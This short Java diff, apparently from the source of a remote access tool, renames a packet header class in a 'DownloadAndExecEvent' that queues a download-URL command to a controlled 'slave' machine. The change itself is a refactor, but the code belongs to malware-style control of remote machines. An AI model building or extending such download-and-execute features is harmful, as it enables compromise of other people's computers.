@@ -4,8 +4,8 @@ import javax.swing.ImageIcon;
 import javax.swing.JOptionPane;
 
 import com.redpois0n.Slave;
+import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
-import com.redpois0n.packets.outgoing.Header;
 import com.redpois0n.utils.IconUtils;
 import com.redpois0n.utils.Util;
 
@@ -25,7 +25,7 @@ public class DownloadAndExecEvent extends Event {
 	}
 
 	public void perform(Slave slave) {
-		slave.addToSendQueue(new PacketBuilder(Header.DOWNLOAD_URL, new String[] { url }));
+		slave.addToSendQueue(new PacketBuilder(OutgoingHeader.DOWNLOAD_URL, new String[] { url }));
 	}
 
 	public String toString() {
